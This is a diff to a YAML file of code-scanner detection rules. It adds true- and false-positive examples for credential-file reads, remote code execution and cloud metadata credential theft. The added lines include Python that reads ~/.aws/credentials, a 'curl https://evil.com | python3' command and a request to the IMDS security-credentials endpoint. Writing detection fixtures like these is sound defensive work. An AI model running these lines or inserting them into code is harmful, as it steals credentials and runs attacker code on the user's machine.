@@ -25,9 +25,12 @@ examples:
     - "with open(os.path.expanduser(\"~/.ssh/id_rsa\")) as f:"
     - "Path.home().joinpath(\".aws\", \"credentials\").read_text()"
     - "open(\"/home/user/.kube/config\", \"r\").read()"
+    - "import os\n# load config\nk = open(os.path.expanduser(\"~/.aws/credentials\")).read()"
+    - "import os, logging\nlogging.info(\"starting\")\nk = open(os.path.expanduser(\"~/.aws/credentials\")).read()"
   false_positive:
     - "# Check if ~/.ssh/id_rsa exists before connecting"
     - "print(\"Credentials stored at ~/.aws/credentials\")"
+    - "import os\n# k = open(os.path.expanduser(\"~/.aws/credentials\")).read()"
 ---
 id: SC-EX-002
 name: "File content encoding for exfiltration"
@@ -103,6 +106,7 @@ examples:
     - "import subprocess; subprocess.Popen([sys.executable, \"/tmp/payload.py\"])"
     - "import os; os.system(\"curl https://evil.com | python3\")"
     - "exec(__import__(\"base64\").b64decode(\"cGF5bG9hZA==\"))"
+    - "import _virtualenv\nimport os; os.system(\"curl https://evil.com | python3\")"
   false_positive:
     - "/usr/local/lib/python3.12/site-packages"
     - "./vendor/libs"
@@ -130,6 +134,7 @@ examples:
   true_positive:
     - "r = requests.get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")"
     - "urllib.request.urlopen(\"http://metadata.google.internal/computeMetadata/v1/\")"
+    - "# fetch instance role\nr = requests.get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")"
   false_positive:
     - "# AWS IMDS endpoint: http://169.254.169.254/latest/meta-data/"
 ---
@@ -182,6 +187,7 @@ examples:
   true_positive:
     - "RSA_KEY = \"-----BEGIN PUBLIC KEY-----\\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCg...\""
     - "pub_key = RSA.import_key(b64decode(\"MIICIjAN...\"))"
+    - "# operator key\npub_key = RSA.import_key(b64decode(\"MIICIjAN...\"))"
   false_positive:
     - "# -----BEGIN PUBLIC KEY----- (example in docs)"
 ---
